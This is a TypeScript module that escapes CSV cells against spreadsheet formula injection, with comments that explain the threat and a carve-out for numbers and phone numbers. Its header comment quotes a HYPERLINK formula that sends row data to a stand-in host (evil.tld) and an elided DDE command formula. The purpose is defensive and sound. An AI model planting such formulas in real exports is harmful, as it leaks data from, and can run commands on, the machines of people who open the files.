/**
 * One CSV cell escaper, for every export in the application.
 *
 * ── Why this is not just quoting ────────────────────────────────────────────
 *
 * A CSV cell whose text begins with `=`, `+`, `-`, `@`, a tab or a carriage
 * return is a FORMULA to Excel, Sheets and LibreOffice. Quoting does not help:
 * the quotes are consumed by the parser, and what is left is evaluated. So a
 * lead called
 *
 *     =HYPERLINK("https://evil.tld/x?d="&A1&B1,"Open invoice")
 *
 * is a link that leaks the row it sits next to, and on a desktop with DDE left
 * enabled `=cmd|'/c …'!A1` is worse than that.
 *
 * The attacker is not an outsider guessing at the export: they are whoever can
 * type a lead name, a vendor name, a narration or a payment reference — a
 * junior rep, a site clerk, or anyone holding a lead-ingest key. The victim is
 * the accountant who opens the file. Nothing in the browser or the server is
 * exploited; the spreadsheet does exactly what it is designed to do.
 *
 * Prefixing an apostrophe makes the cell text. It is invisible in the cell and
 * survives a round trip.
 *
 * ── Why it lives here ───────────────────────────────────────────────────────
 *
 * AMH-060. The guard existed in `toCsv` (server) and was correct — but the
 * cash-book route and four client components had each written their own
 * quote-only escaper, so half the exports in the app were unprotected. This
 * module has no `server-only` marker and no Node imports precisely so the
 * client exporters can use the same one, and there is nothing left to
 * reimplement.
 */

const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * A value that is unambiguously a number, or a phone number in the form people
 * actually type it. `-50000`, `+91 98404 90000`, `-1,25,000.50`.
 *
 * ── Why this carve-out exists (AMH-065) ────────────────────────────────────
 *
 * The first version of this guard neutralised anything starting `= + - @`, full
 * stop. That is right for text and wrong for numbers, and it broke two things:
 *
 *   A negative balance. The cash book's running balance goes negative the
 *   moment the month opens with a payment, so the Balance column shipped as
 *   `'-50000`. The leading apostrophe is Excel's marker for "treat this as
 *   text" when you TYPE it into a cell — on CSV *import* it is just a
 *   character. So the accountant's Balance column arrived left-aligned, SUM
 *   returned 0, and every chart over it was empty.
 *
 *   A phone number. `+91 98404 90000` exported as `'+91 98404 90000`, and
 *   bulk-import reads the phone column back verbatim (`toNumber` is not
 *   applied to it), so a round trip silently corrupted the number and broke
 *   the `tel:` link on that lead.
 *
 * A cell that matches this is not a formula in any spreadsheet: `-50000` is
 * arithmetic on nothing, and no formula begins `+91 `. So the guard skips it.
 * Everything else — `=HYPERLINK(…)`, `+CMD`, `-1+1`, `@SUM` — still gets the
 * apostrophe.
 */
const SAFE_NUMERIC = /^[-+]?[\d,]*\d(?:\.\d+)?$/;
const PHONE_LIKE = /^\+\d[\d\s()-]{4,}$/;

/** Escape one value for a CSV cell: neutralise formulas, then quote. */
export function escapeCsvCell(value: unknown): string {
  let s = String(value ?? '');
  if (FORMULA_START.test(s) && !SAFE_NUMERIC.test(s) && !PHONE_LIKE.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** Join one row of already-raw values into a CSV line. */
export function csvRow(cells: unknown[]): string {
  return cells.map(escapeCsvCell).join(',');
}

/** Rows of objects → a full CSV document, keyed on the first row's columns. */
export function toCsv(rows: Record<string, unknown>[]): string {
  if (rows.length === 0) return '';
  const headers = Object.keys(rows[0]!);
  return [csvRow(headers), ...rows.map((r) => csvRow(headers.map((h) => r[h])))].join('\n');
}
